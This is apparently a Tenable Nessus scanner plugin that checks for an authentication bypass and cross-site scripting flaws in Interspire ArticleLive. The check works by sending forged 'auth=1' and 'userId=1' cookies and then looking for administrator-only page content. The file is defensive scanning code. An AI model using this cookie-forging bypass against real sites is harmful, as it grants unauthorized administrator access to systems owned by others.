#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18199);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-1482", "CVE-2005-1483");
  script_bugtraq_id(13493);
  script_osvdb_id(16179, 16181, 16182, 16183, 17780);

  script_name(english:"Interspire ArticleLive Multiple Remote Vulnerabilities (XSS, Auth Bypass)");

 script_set_attribute(attribute:"synopsis", value:
"The remote server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of Interspire ArticleLive that
suffers from the following vulnerabilities :

  - A session handling flaw allowing a remote attacker to gain administrator
    access.
  - Multiple cross-site scripting vulnerabilities.

The session handling vulnerability can be exploited by remote
attackers to get administrator access to the remote content management
system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 2005.0.5 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/03");
 script_cvs_date("$Date: 2015/02/02 19:32:50 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in Interspire ArticleLive";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

init_cookiejar();

foreach dir (make_list (cgi_dirs(), "/admin"))
{
  set_http_cookie(name: 'auth', value: '1');
  set_http_cookie(name: 'userId', value: '1');
  #  set_http_cookie(name: 'PHPSESSID', value: 'f9a017964773a51af725ff154f0c4d3f');
  
  r = http_send_recv3(port: port, method: 'GET', item: strcat(dir, "/index.php"));
  if (isnull(r)) exit(0);

  if (("Interspire ArticleLive" >< r[2]) && ('<a href="index.php?ToDo=viewPages&pending=1' >< r[2]))
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
